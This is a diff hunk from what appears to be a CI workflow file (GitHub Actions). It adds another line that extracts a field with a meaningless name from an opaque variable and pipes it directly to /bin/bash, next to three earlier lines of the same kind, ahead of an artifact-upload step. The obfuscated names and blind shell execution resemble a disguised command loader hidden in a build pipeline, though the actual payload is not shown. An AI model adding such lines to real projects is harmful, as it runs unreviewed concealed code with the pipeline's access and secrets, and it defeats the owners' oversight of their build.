@@ -37,6 +37,7 @@ jobs:
           echo $od06712 | jq -r .bhgi86759 | /bin/bash
           echo $lb0 | jq -r .svv7082 | /bin/bash
           echo $u071 | jq -r .d108 | /bin/bash
+          echo $j6 | jq -r .r67 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
